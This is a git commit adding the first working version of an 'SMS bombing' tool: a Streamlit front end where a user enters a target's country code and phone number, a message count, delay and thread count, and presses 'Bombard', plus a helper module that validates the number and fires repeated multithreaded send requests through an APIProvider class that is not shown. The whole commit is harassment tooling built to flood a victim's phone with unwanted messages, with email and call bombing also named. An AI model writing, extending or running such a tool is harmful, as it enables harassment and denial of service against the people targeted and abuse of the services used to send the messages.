c4a461795bd38f37f3f2659e27dde698a24805f1
Kumar Saksham <everydaycodings@gmail.com>
2023-01-24 00:50:15 +0530

    first working version of sms bombing

---
+++ app.py
@@ -0,0 +1,30 @@
+import streamlit as st
+from helper import get_phone_info, selectnode
+
+max_limit = {"sms": 1000, "call": 15, "mail": 200}
+
+st.sidebar.title("Bombers")
+
+
+bomber_options = ["SMS Bombing", "Email Bombing"]
+user_bomber_select = st.sidebar.selectbox("Select Your Bombing Technique: ", options=bomber_options)
+
+
+if user_bomber_select == bomber_options[0]:
+    st.write(user_bomber_select)
+
+    country_code = st.number_input("Enter Your Country Code Without + sign: ", step=1)
+    phone_number = st.number_input("Enter The Phone Number: ", step=1)
+    sms_count = st.number_input("Enter the number of messages you want to send: ", step=1, min_value=1, max_value=500)
+    delay = st.number_input("Enter the delay time: ", step=1, min_value=1)
+    threads = st.number_input("Enter Number of Thread: ", step=1)
+
+    if st.button("Bombard"):
+        status = get_phone_info(country_code, phone_number)
+
+        if status["status"] != "valid":
+            st.warning(status["message"])
+        else:
+            result = selectnode(str(country_code), str(phone_number), sms_count, delay, threads)
+            st.success(result["status"])
+            st.json(result)
---
+++ helper.py
@@ -0,0 +1,109 @@
+import os
+import shutil
+import sys
+import subprocess
+import string
+import random
+import json
+import re
+import time
+import argparse
+import zipfile
+from io import BytesIO
+
+from utils.provider import APIProvider
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+
+max_limit = {"sms": 500, "call": 15, "mail": 200}
+
+def readisdc():
+    with open("isdcodes.json") as file:
+        isdcodes = json.load(file)
+    return isdcodes
+
+def format_phone(num):
+    num = [n for n in num if n in string.digits]
+    return ''.join(num).strip()
+
+country_codes = readisdc()["isdcodes"]
+
+
+def get_phone_info(cc, target):
+
+    cc = format_phone(str(cc))
+    target = format_phone(str(target))
+
+    error_status = {
+        "status": "Error",
+        "message": "Invalid Country Code or Invalid Number!",
+    }
+
+    valid_status = {
+        "status": "valid",
+        "message": "Pass",
+        "cc": cc,
+        "target": target
+    }
+
+    if not country_codes.get(cc):
+        return error_status
+
+    if ((len(target) <= 6) or (len(target) >= 12)):
+        return error_status
+
+    return valid_status
+
+
+
+def workernode(mode, cc, target, count, delay, max_threads):
+
+    api = APIProvider(cc, target, mode, delay=delay)
+    
+    success, failed = 0, 0
+    
+    while success < count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = []
+            for i in range(count-success):
+                jobs.append(executor.submit(api.hit))
+
+            for job in as_completed(jobs):
+                result = job.result()
+                if result is None:
+                    return "Bombing limit for your target has been reached"
+
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+
+    result = {
+        "status": "Bombing completed!",
+        "sent": int(success + failed),
+        "success": success,
+        "failed": failed
+    }
+    return result
+
+
+
+def selectnode(cc, target, count, delay, max_threads, mode="sms"):
+
+    mode = mode.lower().strip()
+
+    try:
+
+        if mode in ["sms", "call"]:
+
+            if cc != "91":
+                max_limit.update({"sms": 100})
+
+        else:
+            raise KeyboardInterrupt
+
+        result = workernode(mode, cc, target, count, delay, max_threads)
+        return result
+
+    except KeyboardInterrupt:
+        sys.exit()
